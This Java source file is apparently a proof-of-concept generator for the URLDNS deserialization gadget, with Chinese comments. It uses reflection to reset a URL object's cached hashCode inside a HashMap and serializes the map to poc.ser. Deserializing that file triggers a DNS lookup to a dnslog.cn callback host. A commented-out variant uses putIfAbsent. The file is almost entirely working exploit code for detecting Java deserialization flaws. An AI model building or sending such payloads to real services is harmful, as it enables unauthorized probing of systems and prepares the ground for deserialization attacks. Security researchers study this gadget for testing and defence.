import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNSTest {
    public static void main(String[] args) throws Exception {
        // 原版的
        poc1();

        // 随便换了点东西的
        // poc2();
    }

    public static void poc1() throws Exception {
        HashMap<URL, String> obj = new HashMap<URL, String>();

        String url = "http://test123.wbqgs9.dnslog.cn";
        URL u = new URL(url);

        Class clazz = Class.forName("java.net.URL");
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);

        // 设一个这个值,这样去put的时候就不会去查DNS
        field.set(u, 0xdeadbeef);

        // 这个test可以随便改
        obj.put(u, "test");

        // 一定要设置这个URL对象的hashCode为初始值-1,这样反序列列化时才会重新计算
        // 才会调用URL->hashCode()
        field.set(u, -1);

        // 序列化
        FileOutputStream fileOut = new FileOutputStream("./poc.ser");
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(obj);
        out.close();
        fileOut.close();
    }

//    public static void poc2() throws Exception {
//        HashMap<URL, String> obj = new HashMap<URL, String>();
//
//        String url = "http://123test.wbqgs9.dnslog.cn";
//        URL u = new URL(url);
//
//        Class clazz = Class.forName("java.net.URL");
//        Field field = clazz.getDeclaredField("hashCode");
//        field.setAccessible(true);
//
//        // 设一个这个值,这样去putIfAbsent的时候就不会去查DNS
//        field.set(u, 0xdeadbeef);
//
//        // 这个test可以随便改
//        // 最稳的还是put方法
//        // 注意: 这个方法在jdk1.8或以上才有
//        // 使用这个方法只是单纯的扩展一下说明,一个链不一定就是一成不变的
//        obj.putIfAbsent(u, "test");
//
//        // 一定要设置这个URL对象的hashCode为初始值-1,这样反序列列化时才会重新计算
//        // 才会调用URL->hashCode()
//        field.set(u, -1);
//
//        // 序列化
//        FileOutputStream fileOut = new FileOutputStream("./poc.ser");
//        ObjectOutputStream out = new ObjectOutputStream(fileOut);
//        out.writeObject(obj);
//        out.close();
//        fileOut.close();
//    }
}